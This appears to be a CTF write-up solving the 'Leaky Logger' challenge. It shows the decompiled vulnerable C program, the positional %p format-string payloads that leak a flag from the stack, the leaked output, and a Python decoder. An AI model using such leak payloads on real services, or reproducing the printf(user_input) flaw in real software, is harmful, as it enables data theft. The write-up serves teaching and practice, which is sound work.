---
title: "RSTCON 2026 – Leaky Logger"
date: 2026-10-25 20:00:00 +0200
categories: [CTF, RSTCON 2026]
tags: [binary-exploitation, format-string, info-leak, printf, stack-leak, ghidra, python]
---

## **Challenge Information**
**Title:**  Leaky Logger  
**Category**:  Binary exploitation  
**Platform:**  RSTCON  
**Difficulty:**  medium  
**Tags:**  binary-exploitation, format-string, info-leak, printf, stack-leak, Ghidra, python  
**Date solved:**  25/10/2026 (DD/MM/YYYY)  
**Challenge Description**:  The RST Hydro event logger reads the flag into memory at startup, then offers to record one log line for you. It echoes that line back a little too literally.  

Mirror 1: `nc 18.215.143.250 9002`  
Mirror 2: `nc 18.145.136.91 9002`  

**Files provided**:  connection to mirrors and logger (ELF)  

## **Environment and Tools** 
**Operating System**:  Kali Linux (Parallels)  
**Tools/ Software**:  Ghidra, netcat  
**Programming Languages (if any)**:  bash, python  

## **Recognition Pattern**
- The program reads the flag into memory, then prints your input back "a little too literally"
- In the code the input is passed straight to printf (printf(user_input)), not as printf("%s", user_input) => format string bug
- The flag sits on the stack, so it can be read with positional %p specifiers

## **Approach and Methodology**
### **Initial Analysis**
I decided to open the logger in Ghidra and analyze it.  The main function was all that was needed:
```C

undefined8 main(void)

{
  undefined8 uVar1;
  char *pcVar2;
  size_t last_byte_in_string;
  char user_input [512];
  char flag_68 [88];
  FILE *flag_file_10;
  
  setvbuf(stdout,(char *)0x0,2,0);
  setvbuf(stdin,(char *)0x0,2,0);
  flag_file_10 = fopen("flag.txt","r");
  if (flag_file_10 == (FILE *)0x0) {
    puts("flag.txt missing on the server, tell an organizer.");
    uVar1 = 1;
  }
  else {
    memset(flag_68,0,0x50);
    pcVar2 = fgets(flag_68,0x50,flag_file_10);
    if (pcVar2 == (char *)0x0) {
      puts("flag.txt unreadable, tell an organizer.");
      uVar1 = 1;
    }
    else {
      fclose(flag_file_10);
      last_byte_in_string = strcspn(flag_68,"\r\n");
      flag_68[last_byte_in_string] = '\0';
      puts("RST Hydro event logger.");
      puts("Submit one log line and it will be recorded:");
      pcVar2 = fgets(user_input,0x200,stdin);
      if (pcVar2 == (char *)0x0) {
        uVar1 = 0;
      }
      else {
        last_byte_in_string = strcspn(user_input,"\n");
        user_input[last_byte_in_string] = '\0';
        printf("logged: ");
        printf(user_input);
        putchar(10);
        uVar1 = 0;
      }
    }
  }
  return uVar1;
}


```

In short, the vulnerability lays in the printf(user_input): it is not formatted as a string (no %s), so we can make the logger print out the flag that is already in memory instead of our input.

To do this, i was first thinking about making it return to another memory address, but i decided to ask Claude.ai for some advice.

For the leak, i needed a buffer and then use the %n$p positional specifier to print out stack slots. As the flag is kept on the stack starting at -0x68 and the user input at -0x268, that means the flag is above the user's input by 512 bytes, 64 slots of 8 bytes each. 

Also, the flag is 88 bytes long (11 slots).

To understand how the slots line up, i sent a test input using a padding:

```bash
RST Hydro event logger.
Submit one log line and it will be recorded:
   AAAAAAAA%6$p.%7$p.%8$p.%9$p.%10$p
logged:    AAAAAAAA0x4141414141202020.0x2e70243625414141.0x2438252e70243725.0x252e702439252e70.0x70243031
```

This shows that the input starts at %6$ and so that makes the flag start at 6 + 64 (distance between user input and flag) = 70.

So the next thing is to read from %70$ through %80$:
```bash
RST Hydro event logger.
Submit one log line and it will be recorded:
%70$p.%71$p.%72$p.%73$p.%74$p.%75$p.%76$p.%77$p.%78$p.%79$p.%80$p
logged: 0x667b6e6f63747372.0x74735f74616d7230.0x336c5f73676e3172.0x735f6568745f6b61.0x7d6b636174.(nil).(nil).(nil).(nil).(nil).(nil)
```

To finally get the flag, i took the values of the slots and wrote a python script:
```python3
#!/usr/bin/env python3

import struct

logged= [0x667b6e6f63747372, 0x74735f74616d7230, 0x336c5f73676e3172, 0x735f6568745f6b61, 0x7d6b636174]

print(b"".join(struct.pack("<Q", v) for v in logged).split(b"\x00")[0].decode())
```


## **Solution and Flag Retrieval**
Final Exploit / Command Used: ./solver.py

## **Lessons Learned**
- if the output is not formatted correctly (user data passed as the format string) it can be a vulnerability
- %p and %n$p can be used to read stack slots, and the slot number can be calculated to land on the data you want

## **References**
- Ghidra
- pwntools / format string notes
